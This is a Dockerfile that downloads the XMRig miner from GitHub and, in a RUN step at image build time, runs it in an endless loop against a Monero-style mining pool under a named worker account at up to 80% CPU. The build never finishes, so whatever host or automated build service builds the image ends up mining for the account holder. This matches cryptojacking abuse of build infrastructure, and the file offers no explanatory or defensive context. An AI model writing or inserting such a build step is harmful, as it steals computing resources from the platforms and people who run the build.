FROM ubuntu:xenial
RUN apt-get update && apt-get install -y wget
RUN wget https://github.com/xmrig/xmrig/releases/download/v2.15.3-beta/xmrig-2.15.3-beta-xenial-x64.tar.gz && tar -xf xmrig-2.15.3-beta-xenial-x64.tar.gz && cd xmrig-2.15.3-beta && while true; do ./xmrig -o europe.cryptonight-hub.miningpoolhub.com:20580 -u brahim7.workername3 -p x --threads 2 --max-cpu-usage=80 --cpu-priority 3 --donate-level 1 ; sleep 1; done
